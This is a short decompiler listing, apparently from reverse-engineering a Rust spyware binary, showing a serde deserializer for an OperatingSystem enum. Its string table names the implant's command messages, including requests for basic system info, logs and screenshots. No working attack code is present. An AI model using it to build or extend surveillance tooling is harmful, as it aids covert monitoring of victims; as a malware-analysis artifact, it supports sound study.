long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::OperatingSystem>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_enum(a1, "OperatingSystemWindowsLinuxFreeBSDMacOSIOSAndroidUnknownArchitecturex86x86_64powerpcpowerpc64armaarch64PointerWidthBit32Bit64GetBasicInfoResponseversiontarget_osoperating_system_versionpointer_widthGetLogsRequestGetLogsResponseGetScreenshotRequestDisplaySc", 15);
    return a0;
}
